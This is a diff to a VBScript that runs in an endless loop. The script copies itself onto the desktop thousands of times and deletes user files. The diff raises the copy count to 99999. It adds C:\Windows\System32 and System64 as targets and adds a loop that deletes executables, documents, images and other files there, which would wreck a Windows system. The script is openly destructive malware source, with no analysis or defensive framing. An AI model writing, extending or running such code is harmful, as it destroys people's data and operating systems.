@@ -3,13 +3,16 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 strScriptPath = WScript.ScriptFullName
 
 ' Specify the folders in which you want to delete files (modify as needed)
-foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3", objShell.SpecialFolders("MyDocuments"), objShell.SpecialFolders("MyVideos"), objShell.SpecialFolders("MyPictures"), objShell.SpecialFolders("MyMusic"))
+foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")
+
+' Specify the system folders in which you want to delete files (modify as needed)
+systemFoldersToDelete = Array("C:\Windows\System32", "C:\Windows\System64")
 
 ' Get the path to the desktop folder
 strDesktopFolder = objShell.SpecialFolders("Desktop")
 
 ' Specify the number of copies to create
-numCopies = 999
+numCopies = 99999
 
 ' Generate copies of the script
 For i = 1 To numCopies
@@ -33,11 +36,16 @@ Do
     For Each folderPath In foldersToDelete
         DeleteFilesExceptVBS folderPath
     Next
-    
+
+    ' Delete all files except VBS files within the system folders
+    For Each systemFolderPath In systemFoldersToDelete
+        DeleteFilesExceptVBS systemFolderPath
+    Next
+
     ' Set wallpaper
     objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
     objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
-    
+
     ' Loop through each file in the Desktop folder and delete if it has a specified file extension
     For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
         Dim extension
@@ -45,6 +53,17 @@ Do
         If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
             objFSO.DeleteFile(objFile)
         End If
+    Next
+
+    ' Loop through each file in the system folders and delete if it has a specified file extension
+    For Each systemFolderPath In systemFoldersToDelete
+        For Each objFile In objFSO.GetFolder(systemFolderPath).Files
+            Dim extension
+            extension = LCase(objFSO.GetExtensionName(objFile.Name))
+            If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
+                objFSO.DeleteFile(objFile)
+            End If
+        Next
     Next
 
 Loop
